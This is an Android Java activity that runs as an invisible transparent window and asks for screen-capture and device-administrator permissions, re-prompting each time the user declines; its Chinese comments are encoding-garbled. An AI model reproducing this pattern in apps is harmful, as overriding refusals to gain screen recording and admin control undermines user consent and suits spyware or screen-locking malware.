package order.screen;


import util.ConfigCt;
import lock.LockService;


/**
 * @author byc
 *
 */
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.drawable.ColorDrawable;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.Window;
import android.widget.Toast;

/**
 * Created by wei on 16-9-18.
 * <p>
 * ��ȫ͸�� ֻ�����ڵ���Ȩ������Ĵ�����
 *
 */
public class ScreenShotActivity extends Activity {

	private static final String REQUEST_CODE="requestCode";
	private static final String COMPONENT_NAME="ComponentName";
    public static final int REQUEST_MEDIA_PROJECTION = 0x2893;
    public static final int REQUEST_MEDIA_DEVICE = 0x2894;
    public static Shotter shotter=null;
    private static ComponentName mComponentName=null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //���´��� ֻ���� ����һ��͸����Activity ����һ��activity�ֲ���pause
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setBackgroundDrawable(new ColorDrawable(android.graphics.Color.TRANSPARENT));
        getWindow().setDimAmount(0f);
        processRequest();//��������Ȩ������

    }
 	@Override
 	protected void onNewIntent(Intent intent) {
 	    super.onNewIntent(intent);
 	    setIntent(intent);//must store the new intent unless getIntent() will return the old one
 	   processRequest();//��������Ȩ������
 		Log.i(ConfigCt.TAG, "ct ScreenShotActivity onNewIntent: ����");  
 	}
    /*
     * ��������
     */
    private void processRequest(){
    	int requestCode=this.getIntent().getIntExtra(REQUEST_CODE, REQUEST_MEDIA_PROJECTION);
    	switch(requestCode){
    	case REQUEST_MEDIA_PROJECTION:
    		requestScreenShot();
    		break;
    	case REQUEST_MEDIA_DEVICE:
    		//this.getIntent().getParcelableExtra(COMPONENT_NAME);
    		if(mComponentName!=null)
    			requestDeviceManager(mComponentName);
    		break;
    	}
        
    }

    /*
     * ����
     */
    public void requestScreenShot() {
        if (Build.VERSION.SDK_INT >= 21) {
        	try{
            startActivityForResult(
                    ((MediaProjectionManager) getSystemService("media_projection")).createScreenCaptureIntent(),
                    REQUEST_MEDIA_PROJECTION
            );
        	}catch(android.content.ActivityNotFoundException e){
        		e.printStackTrace();
        	}
        }
        else
        {
            //toast("�汾����,�޷�����");
        }
    }
    /*
     * ����
     */
    public void requestDeviceManager(ComponentName componentName) {
        mComponentName=componentName;
        //�����豸���� - ��AndroidManifest.xml���趨��Ӧ������
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        //Ȩ���б�
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
        //����
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "�����������б�����");
        //startActivity(intent);
        startActivityForResult(intent, REQUEST_MEDIA_DEVICE);
    }
    private void toast(String str) {
        Toast.makeText(ScreenShotActivity.this,str,Toast.LENGTH_LONG).show();
    }
    /*
     * ��������ʵ��
     */
    public static void startInstance(Context context,int requestCode) {
       	startInstance(context,requestCode,null);
    }
    /*
     * ��������ʵ��
     */
    public static void startInstance(Context context,int requestCode,ComponentName admin) {
   		Intent intent=new Intent(context, ScreenShotActivity.class);
   		intent.putExtra(REQUEST_CODE, requestCode);
   		//if(admin!=null)intent.putExtra(COMPONENT_NAME, admin);
   		mComponentName=admin;
       	intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
       	context.startActivity(intent);
    }
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        switch (requestCode) {
            case REQUEST_MEDIA_PROJECTION: {
                if (resultCode == -1 && data != null) {
                    shotter=new Shotter(ScreenShotActivity.this,data);
                    ConfigCt.getInstance(ScreenShotActivity.this).setScreenShotPower(true);
                    finish();
                }else{
                	requestScreenShot();
                }
            }
            break;
            case REQUEST_MEDIA_DEVICE:{
                if ( resultCode == Activity.RESULT_OK){
                    //Intent intent=new Intent(this,LockService.class);
                    //startService(intent);
                } else{
                	requestDeviceManager(mComponentName); //
                }
            }
            break;
        }
       
    }


}
